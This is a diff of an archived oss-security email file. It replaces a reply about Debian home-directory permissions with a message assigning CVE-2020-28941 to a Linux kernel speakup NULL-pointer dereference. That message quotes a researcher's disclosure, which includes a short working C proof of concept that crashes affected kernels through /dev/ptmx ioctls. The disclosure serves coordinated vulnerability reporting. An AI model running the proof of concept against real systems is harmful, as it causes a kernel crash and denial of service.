@@ -1,67 +1,78 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/10/07/6
-Message-ID: <D9ABD55E-B4E7-4713-89DA-9FC17DAA7DF1@thermi.consulting>
-Date: Wed, 07 Oct 2020 20:07:34 +0000
-From: Noel Kuntze <noel.kuntze@...rmi.consulting>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/19/5
+Message-ID: <20201119162507.GA4986@suse.de>
+Date: Thu, 19 Nov 2020 17:25:08 +0100
+From: Marcus Meissner <meissner@...e.de>
 To: oss-security@...ts.openwall.com
-Subject: Re: Debian FEATURE: /home/loser is with permissions 755, default umask 0022
+Cc: nopitydays@...il.com
+Subject: Re: Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close
 Content-Type: text/plain; charset=utf-8
 
 Hi,
 
-It'd be sensible for the mode to be 751 and have public_html and, for example, a hypothetical "share" directory to have mode 755.
+Mitre has assigned CVE-2020-28941 to this issue.
 
-Kind regards
+Ciao, Marcus
+On Thu, Nov 19, 2020 at 10:46:59AM +0800, Shisong Qin wrote:
+> Hi,
+> 
+> Recently we found a NULL-ptr deref BUG in spk_ttyio.c in the longterm 4.19
+> Linux kernel, and it could also be triggered in the 5.9 Linux kernel. In
+> function spk_ttyio_ldisc_close, it would free the "speakup_tty->disc_data"
+> and set "speakup_tty" to NULL. However, if we open two tty device and use
+> tiocsetd() to set them as "speakup_tty" and close them in turn, the first
+> close would set "speakup_tty" to NULL, and in the second close would try to
+> dereference the "speakup_tty", leading to a NULL-ptr deref crash.
+> 
+> This bug could be reproduced in the longterm 4.19 Linux kernel with
+> CONFIG_STAGING=y, CONFIG_SPEAKUP=y and CONFIG_KASAN=y.
+> To reproduce it in the 5.9 Linux kernel, CONFIG_ACCESSIBILITY=y is also
+> required in config, and here is a simple poc:
+> 
+> #define _GNU_SOURCE
+> 
+> #include <dirent.h>
+> #include <endian.h>
+> #include <errno.h>
+> #include <fcntl.h>
+> #include <signal.h>
+> #include <stdarg.h>
+> #include <stdbool.h>
+> #include <stdint.h>
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <sys/prctl.h>
+> #include <sys/stat.h>
+> #include <sys/syscall.h>
+> #include <sys/types.h>
+> #include <sys/wait.h>
+> #include <time.h>
+> #include <unistd.h>
+> 
+> int main(void) {
+>     int disc = 0x1a;
+>     int fd = open("/dev/ptmx", O_RDWR, 0);
+>     ioctl(fd, 0x5423, &disc);
+>     int fd2 = open("/dev/ptmx", O_RDWR, 0);
+>     ioctl(fd2, 0x5423, &disc);
+>     return 0;
+> }
+> 
+> After the process return, it seems the automated calling to release would
+> trigger the NULL-ptr deref bug.
+> 
+> Here is the commit to patch this BUG:
+> https://git.kernel.org/pub/scm/linux/kernel/git/gregkh/tty.git/commit/?h=tty-linus&id=d4122754442799187d5d537a9c039a49a67e57f1
+> 
+> Timeline:
+> * 2020/11/10 - Vulnerability reported to security@...nel.org
+> * 2020/11/11 - Vulnerability confirmed, and reported to
+> linux-distros@...openwall.org.
+> * 2020/11/19 - Vulnerability opened.
+> 
+> Thanks,
+> Shisong Qin and Bodong Zhao, Tsinghua University
 
-Noel
-
-Am October 7, 2020 7:18:56 PM UTC schrieb Jeremy Stanley <fungi@...goth.org>:
->On 2020-10-07 21:00:35 +0300 (+0300), Georgi Guninski wrote:
->> https://lists.debian.org/debian-security/2020/10/msg00000.html
->> 
->> ===
->> /home/loser is with permissions 755, default umask 0022
->> 
->> on multiuser machines this sucks much.
->> 
->> on a multiuser debian mirror we found a lot of data,
->> including the wordpress password of the admin.
->> ===
->
->It's tradition that on multi-user systems, users would want to share
->data with one another and also serve content from their home
->directories in Web sites. Further, it's not at all uncommon for
->sysadmins to not understand or consider the system defaults when
->making deployment decisions and failing to secure sensitive files.
->
->As a long-time Debian user myself, I agree that this default is
->showing its age, and can represent a risk for operators who overlook
->it.
->
->> Then in the thread someone with @debian.org email explains
->> to me it is a feature, not a bug.
->
->Nowhere in that response do they call it a feature, and it's
->disingenuous of you to imply that they did. It's a default, which is
->almost always going to be a balance between two (or more) competing
->needs. Also, I encourage you to take a guess at how many people
->there are "with @debian.org email" (hint, it's not a small number).
->
->A more informative response would probably have been to point you to
->https://wiki.debian.org/Debate/umask which provides pointers to
->where and how this would need to be solved in the long run.
->
->> In a addition, they suggest to tell them the mirror, lol.
->
->Yes, do you fault them for wanting to remove a likely compromised
->server from the network of volunteer-run package mirrors?
->
->> Are debian detached from reality?
->
->Your brusque and insulting attitude (saying their choices suck,
->calling them detached from reality, laughing at their explanations)
->is likely to trigger glib responses and cause people to be less
->inclined to pay attention to what you have to say.
->-- 
->Jeremy Stanley
-
+-- 
+Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@...e.de>
